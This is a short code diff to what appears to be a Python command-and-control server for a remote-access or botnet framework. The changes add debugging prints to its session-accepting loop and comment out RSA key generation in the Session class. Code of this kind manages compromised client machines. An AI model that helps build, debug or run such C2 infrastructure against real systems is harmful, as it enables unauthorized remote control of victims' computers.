@@ -1005,7 +1005,7 @@ class C2():
         while True:
             print('connecting')
             connection, address = self.socket.accept()
-            session = Session(connection=connection, id=self._count)
+            session = Session(connection=connection, id=self._count) # hanging here
             print('b4 if')
             if session.info != None:
                 info = self.database.handle_session(session.info)
@@ -1018,12 +1018,15 @@ class C2():
                     else:
                         util.display("\n\n[+]", color='green', style='bright', end=' ')
                         util.display("Connection:", color='white', style='bright', end=' ')
+                    print('before display')
                     util.display(address[0], color='white', style='normal')
                     util.display("    Session:", color='white', style='bright', end=' ')
                     util.display(str(session.id), color='white', style='normal')
                     util.display("    Started:", color='white', style='bright', end=' ')
                     util.display(time.ctime(session._created), color='white', style='normal')
                     session.info = info
+
+                    print('after out')
 
                     print('creating sockets')
                     self.sessions[int(session.id)] = session
@@ -1275,8 +1278,8 @@ class Session(threading.Thread):
         self.key = security.diffiehellman(self.connection)
         # self.rsa = security.Crypto.PublicKey.RSA.generate(2048)
 
-        from Crypto.PublicKey import RSA
-        self.rsa = RSA.generate(2048)
+        # from Crypto.PublicKey import RSA
+        # self.rsa = RSA.generate(2048)
 
         try:
             self.info = self.client_info()
